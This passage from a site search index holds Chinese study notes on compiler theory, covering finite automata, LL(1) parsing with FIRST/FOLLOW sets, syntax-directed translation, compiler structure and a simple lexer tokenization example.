...}</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_10","title":"\u8f6c\u6362","text":"<p>DFA \u548c NFA \u5177\u6709\u7b49\u4ef7\u6027\uff0c\u5bf9\u4efb\u4f55\u975e\u786e\u5b9a\u7684\u6709\u7a77\u81ea\u52a8\u673a NFA \uff0c\u5b58\u5728\u5b9a\u4e49\u540c\u4e00\u8bed\u8a00\u7684\u786e\u5b9a\u7684\u6709\u7a77\u81ea\u52a8\u673a DFA\uff0c\u53cd\u4e4b\u4ea6\u7136\u3002</p> <p>\u524d\u6587\u63d0\u53ca\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u3001\u6b63\u5219\u6587\u6cd5\u3001\u6709\u7a77\u81ea\u52a8\u673a\u4e09\u8005\u662f\u7b49\u4ef7\u7684\uff0c\u5f80\u5f80\u9700\u8981\u5c06\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u8868\u793a\u4e3a\u6709\u7a77\u81ea\u52a8\u673a\u3002</p> <p>\u6b64\u5916\uff0c\u6784\u9020\u8bc6\u522b\u7ed9\u5b9a\u8bed\u8a00\u7684 NFA \u5f80\u5f80\u6bd4\u6784\u9020\u8fd9\u4e2a\u8bed\u8a00\u7684 DFA \u8981\u5bb9\u6613\u5f88\u591a\uff0c\u56e0\u6b64\u9996\u5148\u4f1a\u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u6784\u5efa NFA\uff0c\u56e0\u4e3a NFA \u9700\u8981\u56de\u6eaf\uff0c\u56e0\u6b64 NFA \u6548\u7387\u66f4\u4f4e\uff0c\u5f80\u5f80\u8fd8\u9700\u8981\u57fa\u4e8e NFA \u6784\u5efa DFA\u3002</p> <p></p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_11","title":"\u7b2c\u56db\u7ae0 \u8bed\u6cd5\u5206\u6790","text":"<p>\u8bed\u6cd5\u5206\u6790\u4e3b\u8981\u6709\u4e24\u79cd\u65b9\u5f0f\uff1a</p> <ul> <li>\u81ea\u9876\u5411\u4e0b\u7684\u5206\u6790\uff08Top-Down Parsing\uff09</li> <li>\u81ea\u5e95\u5411\u4e0a\u7684\u5206\u6790\uff08Bottom-up Parsing\uff09</li> </ul> <p>\u524d\u6587\u63d0\u53ca\u63a8\u5bfc\u548c\u89c4\u7ea6\uff0c\u6bcf\u4e00\u6b65\u63a8\u5bfc\u4e2d\uff0c\u90fd\u9700\u8981\u505a\u4e24\u4e2a\u9009\u62e9\uff1a</p> <ul> <li>\u66ff\u6362\u5f53\u524d\u53e5\u578b\u4e2d\u7684\u54ea\u4e2a \u975e\u7ec8\u7ed3\u7b26</li> <li>\u7528\u8be5\u975e\u7ec8\u7ed3\u7b26\u7684\u54ea\u4e2a\u5019\u9009\u5f0f\u8fdb\u884c\u66ff\u6362</li> </ul> <p>\u9996\u5148\u89e3\u51b3\u7b2c\u4e00\u4e2a\u95ee\u9898\uff0c\u5206\u4e3a\u4e24\u79cd\u4e0d\u540c\u7684\u63a8\u5bfc\u65b9\u5f0f\uff1a</p> <ul> <li>\u6700\u5de6\u63a8\u5bfc\uff08Left-most Derivation\uff09\uff1a\u59cb\u7ec8\u9009\u62e9\u6bcf\u4e2a\u53e5\u578b\u7684 \u6700\u5de6\u975e\u7ec8\u7ed3\u7b26 \u8fdb\u884c\u66ff\u6362\u3002</li> </ul> <p></p> <p>\u81ea\u9876\u5411\u4e0b\u7684\u8bed\u6cd5\u5206\u6790\u91c7\u7528\u6700\u5de6\u63a8\u5bfc\u65b9\u5f0f \u3002</p> <ul> <li>\u6700\u53f3\u63a8\u5bfc\uff08Right-most Derivation\uff09</li> </ul> <p></p> <p>\u5728\u81ea\u5e95\u5411\u4e0a\u7684\u5206\u6790\u4e2d\uff0c\u603b\u662f\u91c7\u7528\u6700\u5de6\u5f52\u7ea6\u7684\u65b9\u5f0f\uff0c\u56e0\u6b64\u628a\u6700\u5de6\u5f52\u7ea6\u79f0\u4e3a\u89c4\u8303\u5f52\u7ea6\uff0c\u800c\u6700\u53f3\u63a8\u5bfc\u76f8\u5e94\u5730\u79f0\u4e3a\u89c4\u8303\u63a8\u5bfc\u3002</p> <p>\u540c\u4e00\u4e2a\u4e32\u53ef\u80fd\u6709\u591a\u79cd\u63a8\u5bfc\u65b9\u5f0f\uff0c\u4f46\u6700\u5de6\u63a8\u5bfc\u548c\u6700\u53f3\u63a8\u5bfc\u90fd\u662f \u552f\u4e00 \u7684\u3002</p> <p>\u6700\u540e\u89e3\u51b3\u7b2c\u4e8c\u4e2a\u95ee\u9898\uff0c\u7528\u8be5\u975e\u7ec8\u7ed3\u7b26\u7684\u54ea\u4e2a\u5019\u9009\u5f0f\u8fdb\u884c\u66ff\u6362\uff1f</p> <p>\u53ef\u4ee5\u901a\u8fc7\u63d0\u53d6\u5de6\u516c\u56e0\u5b50\u6765\u63a8\u8fdf\u51b3\u5b9a\uff1a</p> <pre><code>\u6587\u6cd5G1\nS \u2192 aAd | aBe\nA \u2192 c\nB \u2192\n\n\u6587\u6cd5G2 \u63d0\u53d6\u5de6\u516c\u56e0\u5b50\nS \u2192 a S'\nS' \u2192 Ad | Be\nA \u2192 c\nB \u2192 b\n</code></pre>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_12","title":"\u81ea\u9876\u5411\u4e0b\u7684\u5206\u6790","text":"<p>\u81ea\u9876\u5411\u4e0b\u5206\u6790\u8fc7\u7a0b\u4e2d\uff0c\u53ef\u80fd\u9700\u8981\u56de\u6eaf\u800c\u5bfc\u81f4\u6548\u7387\u8f83\u4f4e\uff0c\u56e0\u6b64\u5f15\u5165 \u9884\u6d4b\u5206\u6790\uff0c\u901a\u8fc7\u5728\u8f93\u5165\u4e2d\u5411\u524d\u770b k \u4e2a\u6570\u7684\u7b26\u53f7\u6765\u9009\u62e9\u6b63\u786e\u7684\u4ea7\u751f\u5f0f\uff0c\u79f0\u4e3a LL(k)\u6587\u6cd5\u3002</p> <p>\u9996\u5148\u8bb2\u89e3\u81ea\u9876\u5411\u4e0b\u5206\u6790\u3001\u6700\u5de6\u63a8\u5bfc\u65f6\u4f1a\u9047\u5230\u7684\u4e24\u4e2a\u95ee\u9898\u53ca\u5176\u89e3\u51b3\u529e\u6cd5\uff0c\u540e\u7eed\u4ecb\u7ecd\u4f7f\u7528\u9884\u6d4b\u5206\u6790\u7684 LL(1)\u6587\u6cd5\u3002</p> <p>\u95ee\u9898\u4e00</p> <pre><code>\u6587\u6cd5G\nS \u2192 cA | cB\nA \u2192 a\nB \u2192 b\n\u8f93\u5165\nc b\n</code></pre> <p>\u540c\u4e00\u975e\u7ec8\u7ed3\u7b26\u7684\u591a\u4e2a\u5019\u9009\u5f0f\u5b58\u5728\u5171\u540c\u524d\u7f00\uff0c\u5c06\u5bfc\u81f4\u56de\u6eaf\u73b0\u8c61\u3002</p> <p>\u5982\u4e0a\u8ff0\u6587\u6cd5\uff0c\u8f93\u5165 cb\uff0c\u81ea\u9876\u5411\u4e0b\u6700\u5de6\u63a8\u5bfc\uff0c\u9996\u5148\u8fdb\u5165 c\uff0c\u7136\u540e\u9009\u62e9 A\uff0cA \u4ea7\u751f\u5f0f\u4ec5\u6709 a\uff0c\u56e0\u6b64\u56de\u6eaf\uff0c\u9009\u62e9 B\uff0c</p> <p>\u6b63\u786e\u3002</p> <p>\u95ee\u9898\u4e8c</p> <pre><code>\u6587\u6cd5G1 \u76f4\u63a5\u5de6\u9012\u5f52\nA \u2192 Aa|b\n\n\u6587\u6cd5G2 \u95f4\u63a5\u5de6\u9012\u5f52\n\nS \u2192 Aa|b\nA \u2192 Sc\n</code></pre> <p>\u5982\u679c\u4e00\u4e2a\u6587\u6cd5\u4e2d\u6709\u4e00\u4e2a\u975e\u7ec8\u7ed3\u7b26 A \u4f7f\u5f97\u5bf9\u67d0\u4e2a\u4e32 \u03b1 \u5b58\u5728\u4e00\u4e2a\u63a8\u5bfc A \u21d2<sup>+</sup>A\u03b1 \uff0c\u90a3\u4e48\u8fd9\u4e2a\u6587\u6cd5\u5c31\u662f\u5de6\u9012\u5f52\u7684\u3002</p> <p>\u4e0a\u8ff0\u4e24\u4e2a\u6587\u6cd5\u5206\u522b\u662f\u76f4\u63a5\u5de6\u9012\u5f52\u548c\u95f4\u63a5\u5de6\u9012\u5f52\uff0c\u4f1a\u5bfc\u81f4\u6700\u5de6\u63a8\u5bfc\u65f6\u51fa\u73b0\u65e0\u9650\u5faa\u73af\u3002</p> <p>\u6d88\u9664\u5de6\u9012\u5f52\u7684\u65b9\u5f0f\u5c31\u662f\u5c06\u5de6\u9012\u5f52\u66ff\u6362\u6210\u53f3\u9012\u5f52\u3002</p> <pre><code>\u6587\u6cd5G3 \u5de6\u9012\u5f52\nA \u2192 A\u03b1|\u03b2(\u03b1\u2260\u7a7a\u4e32\u03b5\uff0c\u03b2\u4e0d\u4ee5A\u5f00\u5934)\n</code></pre> <p>\u4e0a\u8ff0\u6587\u6cd5\u7684\u6b63\u5219\u8868\u8fbe\u5f0f r \u4e3a \u03b2\u03b1<sup>*</sup>\uff0c\u6784\u5efa\u5176\u5bf9\u5e94\u7684\u7b49\u4ef7\u53f3\u9012\u5f52\u6587\u6cd5\u4e3a\uff1a</p> <pre><code>\u6587\u6cd5G4 \u53f3\u9012\u5f52\nA \u2192 \u03b2A\u2032\nA\u2032 \u2192 \u03b1A\u2032\uff5c\u03b5\n</code></pre> <p>\u8f6c\u6362\u7684\u4ee3\u4ef7\u662f\u5f15\u5165\u4e86\u65b0\u7684\u975e\u7ec8\u7ed3\u7b26\u548c\u7a7a\u4e32 \u03b5\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#ll1","title":"LL(1)\u6587\u6cd5","text":"<p>\u5728\u4ecb\u7ecd LL(1)\u6587\u6cd5\u4e4b\u524d\uff0c\u9996\u5148\u9700\u8981\u4ecb\u7ecd\u4e09\u79cd\u7b26\u53f7\u96c6\u5408\uff1a</p> <ul> <li>\u975e\u7ec8\u7ed3\u7b26\u7684\u540e\u7ee7\u7b26\u53f7\u96c6\uff0c\u67d0\u4e2a\u53e5\u578b\u4e2d\u7d27\u8ddf\u5728\u975e\u7ec8\u7ed3\u7b26 A \u540e\u8fb9\u7684\u7ec8\u7ed3\u7b26 a \u7684\u96c6\u5408\uff0c\u8bb0\u4e3a FOLLOW(A)\u3002\u82e5 A \u4e3a\u67d0\u4e2a\u53e5\u578b\u7684\u6700\u53f3\u7b26\u53f7\uff0c\u5219\u5c06\u7ed3\u675f\u7b26\u201d$\u201c\u6dfb\u52a0\u5230 FOLLOW(A)\u4e2d\u3002</li> </ul> <p>\u4f8b\u5982\uff1a\u80fd\u63a8\u5bfc\u51fa Aa \u548c Ab\uff0c\u6b64\u65f6 FOLLOW(A) = {a,b}</p> <ul> <li>\u4e32\u9996\u7ec8\u7ed3\u7b26\u96c6\uff1a\u7ed9\u5b9a\u4e00\u4e2a\u6587\u6cd5\u7b26\u53f7\u4e32 \u03b1\uff0c\u03b1 \u7684\u4e32\u9996\u7ec8\u7ed3\u7b26\u88ab\u5b9a\u4e49\u4e3a\u53ef\u4ee5\u4ece \u03b1 \u63a8\u5bfc\u51fa\u7684\u6240\u6709\u4e32\u9996\u7ec8\u7ed3\u7b26\u6784\u6210\u7684\u96c6\u5408\uff0c\u8bb0\u4e3a FIRST(\u03b1)\u3002\u5982\u679c \u03b1 \u21d2 <sup>*</sup>\u03b5\uff0c\u90a3\u4e48 \u03b5 \u4e5f\u9700\u8981\u6dfb\u52a0\u5230 FIRST(\u03b1)\u4e2d\u3002</li> </ul> <p>\u901a\u4fd7\u89e3\u91ca\uff1aFIRST(A) = \u4ece\u975e\u7ec8\u7ed3\u7b26 A \u63a8\u5bfc\u5f97\u5230\u7684\u53e5\u5b50\u5f00\u5934\u7684\u6240\u6709\u53ef\u80fd\u7ec8\u7ed3\u7b26\u7684\u96c6\u5408\u3002</p> <p>\u4f8b\u5982\uff1aA \u53ef\u4ee5\u63a8\u5bfc\u51fa\u4e24\u4e2a\u53e5\u5b50\u3002ab \u548c bc\u3002\u6b64\u65f6\u79f0 FIRST(A) = {a,b}</p> <ul> <li>\u4ea7\u751f\u5f0f\u7684\u53ef\u9009\u96c6\uff0c\u662f\u6307\u53ef\u4ee5\u9009\u7528\u8be5\u4ea7\u751f\u5f0f\u8fdb\u884c\u63a8\u5bfc\u65f6\uff0c\u5bf9\u5e94\u7684\u8f93\u5165\u7b26\u53f7\u7684\u96c6\u5408\uff0c\u8bb0\u4e3a SELECT(A\u2192\u03b2)\u3002\u57fa\u4e8e\u4e0a\u8ff0\u4e24\u4e2a\u7b26\u53f7\u96c6\uff0c\u53ef\u9009\u96c6\u53ef\u4ee5\u88ab\u5b9a\u4e49\u4e3a\uff1a</li> <li>\u5982\u679c \u03b5\u2209FIRST(\u03b1), \u90a3\u4e48 SELECT(A\u2192\u03b1)= FIRST(\u03b1)</li> <li>\u5982\u679c \u03b5\u2208FIRST(\u03b1), \u90a3\u4e48 SELECT(A\u2192\u03b1)=( FIRST(\u03b1)-{\u03b5} )\u222a FOLLOW(A)</li> </ul> <p>\u4e0b\u9762\u4ecb\u7ecd LL(1)\u6587\u6cd5\uff1a</p> <ul> <li>\u7b2c\u4e00\u4e2a L\uff1a\u8868\u793a\u4ece\u5de6\u5230\u53f3\u626b\u63cf\u8f93\u5165</li> <li>\u7b2c\u4e8c\u4e2a L\uff1a\u8868\u793a\u6700\u5de6\u63a8\u5bfc</li> <li>1\uff1a\u8868\u793a\u6bcf\u4e00\u6b65\u4e2d\u53ea\u9700\u8981\u5411\u524d\u770b\u4e00\u4e2a\u8f93\u5165\u7b26\u53f7\u6765\u51b3\u5b9a\u8bed\u6cd5\u5206\u6790\u52a8\u4f5c</li> </ul> <p>\u5f53\u6587\u6cd5 G \u662f LL(1)\u7684\uff0c\u5f53\u524d\u4ec5\u5f53 G \u7684\u4efb\u610f\u4e24\u4e2a\u5177\u6709\u76f8\u540c \u5de6\u90e8\uff08\u5373\u4e24\u4e2a\u4ea7\u751f\u5f0f\u90fd\u662f A\u2192xxx\uff09 \u7684\u4ea7\u751f\u5f0f A\u2192\u03b1|\u03b2 \u6ee1\u8db3\u4e0b\u9762\u7684\u6761\u4ef6\uff1a</p> <ul> <li> <p>\u5982\u679c \u03b1 \u548c \u03b2 \u5747\u4e0d\u80fd\u63a8\u5bfc\u51fa \u03b5\uff0c\u5219 FIRST(\u03b1)\u2229FIRST(\u03b2)=\u03a6</p> </li> <li> <p>\u5982\u679c \u03b1 \u548c \u03b2 \u4e2d\u81f3\u591a\u6709\u4e00\u4e2a\u80fd\u63a8\u5bfc\u51fa \u03b5</p> </li> <li> <p>\u03b2 \u21d2* \u03b5\uff0c\u5219 FIRST (\u03b1)\u2229FOLLOW(A) =\u03a6\uff1b</p> </li> <li> <p>\u03b1 \u21d2* \u03b5\uff0c\u5219 FIRST (\u03b2)\u2229FOLLOW(A) =\u03a6\uff1b</p> </li> </ul> <p>\u5b9e\u4f8b</p> <p>\u4e32\u9996\u7ec8\u7ed3\u7b26\u96c6</p> \u4ea7\u751f\u5f0f \u4e32\u9996\u7ec8\u7ed3\u7b26\u96c6 E \u2192 TE' FIRST ( E ) = E' \u2192 +TE' |\u03b5 FIRST ( E' ) = T \u2192 FT ' FIRST ( T ) = T' \u2192 *FT ' |\u03b5 FIRST ( T' ) = F \u2192 (E)|id FIRST ( F ) = <p>\u975e\u7ec8\u7ed3\u7b26\u7684\u540e\u7ee7\u7b26\u53f7\u96c6</p> \u4ea7\u751f\u5f0f \u4e32\u9996\u7ec8\u7ed3\u7b26\u96c6 \u975e\u7ec8\u7ed3\u7b26\u7684\u540e\u7ee7\u7b26\u53f7\u96c6 E \u2192 TE' FIRST ( E ) = FOLLOW( E ) = E' \u2192 +TE' |\u03b5 FIRST ( E' ) = FOLLOW( E' )= T \u2192 FT' FIRST ( T ) = FOLLOW( T ) = T' \u2192 FT' |\u03b5 FIRST ( T' ) = FOLLOW( T' ) = F \u2192 (E) |id FIRST ( F ) = FOLLOW( F ) = <p>\u2460FOLLOW(E)\uff1a</p> <ul> <li>\u7531\u4e8e E \u662f\u53e5\u578b E \u7684\u6700\u53f3\u7b26\u53f7\uff0c\u56e0\u6b64$\u52a0\u5165\u5176\u4e2d\u3002</li> <li>\u7531\u4e8e\u5b58\u5728\u4ea7\u751f\u5f0f<code>F \u2192 (E) \\|id</code>\uff0cE \u7684\u540e\u9762\u662f<code>)</code>\uff0c\u56e0\u6b64\u628a`)\u52a0\u5165\u5176\u4e2d\u3002</li> </ul> <p>\u2461FOLLOW(F)</p> <ul> <li>\u6839\u636e\u4ea7\u751f\u5f0f<code>T \u2192 FT'</code>,FOLLOW(F) \u222a= FIRST ( T' ) = { _ } \u6ce8\u610f\uff1a\u03b5\u2208FIRST ( T' ) = { _ \u03b5 }</li> <li>\u7531\u4e8e \u03b5\u2208FIRST ( T' ) \uff0c\u56e0\u6b64 FOLLOW(F) \u222a= FOLLOW( T' ) = { + $ ) }</li> <li>\u56e0\u6b64\u6700\u7ec8 FOLLOW( F ) = { * + $ ) }</li> </ul> <p>\u57fa\u4e8e\u4e0a\u8ff0\u4e24\u4e2a\u7b26\u53f7\u96c6\uff0c\u53ef\u4ee5\u8ba1\u7b97\u51fa\u4ea7\u751f\u5f0f\u7684\u53ef\u9009\u96c6\uff0c\u5e76\u6784\u5efa\u51fa\u9884\u6d4b\u5206\u6790\u8868\u3002</p> <p></p> <p>LL(1)\u6587\u6cd5\u7684\u5206\u6790\u65b9\u6cd5</p> <ul> <li>\u9012\u5f52\u7684\u9884\u6d4b\u5206\u6790\u6cd5</li> <li>\u975e\u9012\u5f52\u7684\u9884\u6d4b\u5206\u6790\u6cd5</li> </ul> <p>\u8be6\u7ec6\u89c1 PDF\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_13","title":"\u81ea\u5e95\u5411\u4e0a\u7684\u5206\u6790","text":"<p>\u5f85\u7eed</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_14","title":"\u7b2c\u4e94\u7ae0 \u8bed\u6cd5\u5236\u5bfc\u7ffb\u8bd1","text":"<p>\u7f16\u8bd1\u7684\u9636\u6bb5\u5171\u6709\u516d\u4e2a\u90e8\u5206\uff1a\u8bcd\u6cd5\u5206\u6790\u3001\u8bed\u6cd5\u5206\u6790\u3001\u8bed\u4e49\u5206\u6790\u3001\u4e2d\u95f4\u4ee3\u7801\u751f\u6210\u3001\u4ee3\u7801\u4f18\u5316\u548c\u76ee\u6807\u4ee3\u7801\u751f\u6210\u3002</p> <p>\u5176\u4e2d\u8bed\u4e49\u5206\u6790\u7684\u7ed3\u679c\u901a\u5e38\u76f4\u63a5\u8868\u793a\u4e3a\u4e2d\u95f4\u4ee3\u7801\u7684\u5f62\u5f0f\uff0c\u56e0\u6b64\u8bed\u4e49\u5206\u6790\u548c\u4e2d\u95f4\u4ee3\u7801\u751f\u6210\u4e24\u4e2a\u6b65\u9aa4\u901a\u5e38\u5408\u4e3a\u4e00\u4e2a\u6b65\u9aa4\uff0c\u79f0\u4e3a\u8bed\u4e49\u7ffb\u8bd1\u3002</p> <p>\u751a\u81f3\u53ef\u4ee5\u5728\u8bed\u6cd5\u5206\u6790\u7684\u540c\u65f6\u8fdb\u884c\u8bed\u4e49\u7ffb\u8bd1\uff0c\u79f0\u4e3a \u8bed\u6cd5\u5236\u5bfc\u7ffb\u8bd1\u3002</p> <p>\u8bed\u6cd5\u5236\u5bfc\u7ffb\u8bd1\u4f7f\u7528\u4e0a\u4e0b\u6587\u65e0\u5173\u8bed\u6cd5\uff08CFG\uff09\u6765\u5f15\u5bfc\u5bf9\u8bed\u8a00\u7684\u7ffb\u8bd1\u3002</p> <p>\u5c06\u8bed\u4e49\u89c4\u5219\u540c\u8bed\u6cd5\u89c4\u5219\uff08\u4ea7\u751f\u5f0f\uff09\u8054\u7cfb\u8d77\u6765\u8981\u8bbe\u8ba1\u4e24\u4e2a\u6982\u5ff5\uff1a</p> <ul> <li>\u8bed\u6cd5\u5236\u5bfc\u5b9a\u4e49\uff08Syntax-Directed Definitions\uff0cSDD\uff09</li> <li>\u8bed\u6cd5\u5236\u5bfc\u7ffb\u8bd1\u65b9\u6848\uff08Syntax-Directed Translation Scheme\uff0cSDT\uff09</li> </ul> <p>SDD \u662f\u5bf9 CFG \u7684\u63a8\u5e7f</p> <ul> <li>\u5c06\u6bcf\u4e2a\u6587\u6cd5\u7b26\u53f7\u548c\u4e00\u4e2a\u8bed\u4e49\u5c5e\u6027\u96c6\u5408\u76f8\u5173\u8054</li> <li>\u5c06\u6bcf\u4e2a\u4ea7\u751f\u5f0f\u548c\u4e00\u7ec4\u8bed\u4e49\u89c4\u5219\u76f8\u5173\u8054\uff0c\u8fd9\u4e9b\u89c4\u5219\u7528\u4e8e\u8ba1\u7b97\u8be5\u4ea7\u751f\u5f0f\u4e2d\u5404\u6587\u6cd5\u7b26\u53f7\u7684\u5c5e\u6027\u503c\u3002</li> </ul> <p>\u5982\u679c X \u662f\u4e00\u4e2a\u6587\u6cd5\u7b26\u53f7\uff0ca \u662f X \u7684\u4e00\u4e2a\u5c5e\u6027\uff0c\u5219\u7528 X.a \u8868\u793a\u5c5e\u6027 a \u5728\u67d0\u4e2a\u6807\u53f7\u4e3a X \u7684\u5206\u6790\u6811\u7ed3\u70b9\u4e0a\u7684\u503c</p> <p>\u4e0a\u8ff0\u5185\u5bb9\u6765\u6e90\u4e8e\u54c8\u5de5\u5927\u7684\u7f16\u8bd1\u539f\u7406\u6559\u7a0b\uff0c\u6211\u7684\u8bc4\u4ef7\u662f\uff0c\u6982\u5ff5 PPT \u70b9\u8bfb\u673a\uff0c\u4e0d\u77e5\u9053\u8981\u505a\u5565\uff0c\u653e\u5f03\u3002</p> <p>\u4e0b\u9762\u770b\u770b\u4e2d\u79d1\u5927\u7684\u7f16\u8bd1\u539f\u7406\u6559\u7a0b</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_15","title":"\u7f16\u8bd1\u5668","text":""},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_16","title":"\u6982\u8ff0","text":"<p>\u9ad8\u7ea7\u8bed\u8a00\u6709\u6210\u5343\u4e0a\u4e07\u79cd\uff0c\u673a\u5668\u662f\u5982\u4f55\u8fd0\u884c\u8fd9\u4e9b\u4e0d\u540c\u7684\u8bed\u8a00\u7684\u5462\uff1f</p> <p>\u7f16\u8bd1\u5668\u662f\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u6838\u5fc3\u529f\u80fd\u662f\u628a\u6e90\u4ee3\u7801\u9759\u6001\u7ffb\u8bd1\u6210\u76ee\u6807\u4ee3\u7801\uff0c\u5e38\u89c1\u7684\u5982</p> <ul> <li>\u6e90\u4ee3\u7801\uff1aC\u3001Java...</li> <li>\u76ee\u6807\u4ee3\u7801\uff1aX86\u3001bytecode\uff08java \u5b57\u8282\u7801\uff09\u3001ARM\u3001IA64\u3001MIPS...</li> </ul> <p>\u7f16\u8bd1\u5668\u7ffb\u8bd1\u540e\u7684\u76ee\u6807\u4ee3\u7801\u7684\u8bed\u4e49\u548c\u6e90\u4ee3\u7801\u76f8\u540c\uff0c\u8be5\u76ee\u6807\u4ee3\u7801\u53ef\u4ee5\u5728\u76ee\u6807\u673a\u5668\u4e0a\u8fd0\u884c\uff0c\u4f8b\u5982\u5bf9\u4e8e Java\uff0c\u8be5\u673a\u5668\u5373\u4e3a Java \u865a\u62df\u673a\u3002</p> <p>\u56e0\u6b64\uff0c\u7f16\u8bd1\u5668\u7684\u8f93\u51fa\u662f\u4e00\u4e2a\u53ef\u6267\u884c\u7a0b\u5e8f\uff0c\u9700\u8981\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u6267\u884c\u540e\uff0c\u624d\u80fd\u5f97\u5230\u7a0b\u5e8f\u7684\u6267\u884c\u7ed3\u679c\uff0c\u800c\u76f8\u5bf9\u6765\u8bf4\uff0c\u7ffb\u8bd1\u5668\u7684\u8f93\u51fa\u76f4\u63a5\u5c31\u662f\u6267\u884c\u7ed3\u679c\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_17","title":"\u7ed3\u6784","text":"<p>\u7f16\u8bd1\u5668\u88ab\u5212\u5206\u4e3a\u4e24\u4e2a\u90e8\u5206\uff0c\u524d\u7aef\u548c\u540e\u7aef\u3002\u524d\u7aef\u63a5\u53d7\u6e90\u7a0b\u5e8f\uff0c\u4ea7\u751f\u4e00\u4e2a\u4e2d\u95f4\u8868\u793a\u4ee3\u7801\uff1b\u540e\u7aef\u63a5\u53d7\u4e2d\u95f4\u8868\u793a\u4ee3\u7801\uff0c\u5c06\u5176\u5904\u7406\u4e3a\u76ee\u6807\u673a\u5668\u7684\u76f8\u5173\u4ee3\u7801\u3002</p> <p>\u524d\u7aef\u548c\u540e\u7aef\u88ab\u62bd\u8c61\u4e3a\u591a\u4e2a\u9636\u6bb5\uff08phase\uff09\uff0c\u56e0\u6b64\u7f16\u8bd1\u5668\u53ef\u4ee5\u770b\u4f5c\u662f\u591a\u4e2a\u9636\u6bb5\u6784\u6210\u7684\u6d41\u6c34\u7ebf\u7ed3\u6784\u3002</p> <p>\u7f16\u8bd1\u5668\u63a5\u53d7\u5b57\u7b26\u5e8f\u5217\uff0c\u7ecf\u8fc7\u5982\u4e0b\u9636\u6bb5\uff1a</p> <ul> <li> <p>\u524d\u7aef</p> </li> <li> <p>\u8bcd\u6cd5\u5206\u6790\uff1a\u8bb0\u53f7\u5e8f\u5217</p> </li> <li> <p>\u8bed\u6cd5\u5206\u6790\uff1a\u62bd\u8c61\u8bed\u6cd5\u6811</p> </li> <li> <p>\u8bed\u4e49\u5206\u6790\uff1a\u4e2d\u95f4\u4ee3\u7801</p> </li> <li> <p>\u540e\u7aef</p> </li> <li> <p>\u4ee3\u7801\u751f\u6210\uff1a\u76ee\u6807\u4ee3\u7801</p> </li> </ul>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_18","title":"\u8bcd\u6cd5\u5206\u6790","text":""},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E4%B8%AD%E7%A7%91%E5%A4%A7%E3%80%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E3%80%8B/#_19","title":"\u4efb\u52a1","text":"<p>\u5982\u4e0a\u8ff0\u6240\u793a\uff0c\u8bcd\u6cd5\u5206\u6790\u63a5\u53d7\u6e90\u7a0b\u5e8f\uff08\u5b57\u7b26\u5e8f\u5217\uff09\uff0c\u8f93\u51fa\u8bb0\u53f7\u5e8f\u5217\u3002</p> <p>\u4e3a\u4e86\u65b9\u4fbf\u7406\u89e3\uff0c\u4ee5\u4e00\u4e2a\u7b80\u5355\u7684\u4ee3\u7801\u4e3a\u4f8b\uff1a</p> <pre><code>if (x &gt; 5)\n    y = \"hello\";\nelse\n    z = 1;\n</code></pre> <p>\u503c\u5f97\u6ce8\u610f\uff1a</p> <ul> <li>\u6bcf\u4e00\u884c\u7684\u672b\u5c3e\u5b58\u5728\u672a\u663e\u793a\u7684\u6362\u884c\u7b26</li> <li>\u5b57\u7b26\u5e8f\u5217\u7684\u672b\u5c3e\u5b58\u5728\u672a\u663e\u793a\u7684\u6587\u4ef6\u7ed3\u675f\u7b26 EOF</li> <li>\u5f80\u5f80\u4f1a\u65e0\u89c6\u7a7a\u767d\u7b26</li> </ul> <p>\u8f93\u51fa\u7684\u6b64\u6cd5\u5206\u6790\u7ed3\u679c\u5982\u4e0b\uff1a</p> <pre><code>IF LPAREN IDENT(X) GT INT(5) RPAREN\n    IDENT(y) ASSIGN STRING(\"hello\") SEMICOLON\nELSE\n    IDENT(z) ASSIGN INT(1) SEMICOLON EOF\n</code></pre> 